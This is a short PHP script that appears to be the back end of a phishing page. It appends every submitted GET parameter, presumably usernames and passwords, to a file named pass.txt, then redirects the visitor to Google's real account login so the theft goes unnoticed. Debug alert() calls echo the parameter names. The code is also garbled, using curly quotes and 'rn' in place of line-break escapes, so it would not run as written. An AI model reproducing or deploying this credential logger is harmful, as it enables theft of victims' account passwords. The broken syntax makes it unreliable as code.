<?php
 echo "<script type = 'text/javascript'> alert('helloo'); </script>";
header(“Location: https://www.google.com/accounts/ServiceLoginAuth “);
        echo "<script type = 'text/javascript'> alert('hii'); </script>";
$handle = fopen(“pass.txt”, “a”);
foreach($_GET as $variable => $value) {
  echo "<script type = 'text/javascript'> alert('$variable'); </script>";
fwrite($handle, $variable);
fwrite($handle, “=”);
fwrite($handle, $value);
fwrite($handle, “rn”);
}
fwrite($handle, “rn”);
fclose($handle);
exit;
?>
